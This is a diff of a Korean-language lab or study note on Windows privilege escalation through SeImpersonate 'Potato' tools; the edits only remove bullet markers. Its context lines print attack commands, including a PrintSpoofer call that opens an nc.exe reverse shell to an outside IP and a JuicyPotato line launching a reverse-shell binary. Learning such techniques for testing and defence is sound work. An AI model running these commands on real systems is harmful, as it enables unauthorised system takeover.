@@ -11,7 +11,7 @@ whoami /priv | findstr /i "SeImpersonate"
 
 ### 현재 계정 확인
 
-- `network service` 등이면 공격 대상
+`network service` 등이면 공격 대상
 
 ```powershell
 whoami
@@ -39,7 +39,7 @@ C:\temp\PrintSpoofer64.exe -i -c "C:\temp\nc.exe 192.168.x.x 4444 -e cmd"
 
 ## 4. 실습: GodPotato / SweetPotato (신 서버, 2012~2022)
 
-- .NET 4 필요, PrintSpoofer 막힌 환경용
+.NET 4 필요, PrintSpoofer 막힌 환경용
 
 ```powershell
 C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
@@ -51,7 +51,7 @@ C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
 
 ### CLSID 선택
 
-- CLSID 목록에서 OS 버전에 맞는 것 선택
+CLSID 목록에서 OS 버전에 맞는 것 선택
 
 ```powershell
 C:\temp\JuicyPotato.exe -l 1337 -p C:\temp\rev.exe -t * -c "{CLSID}"
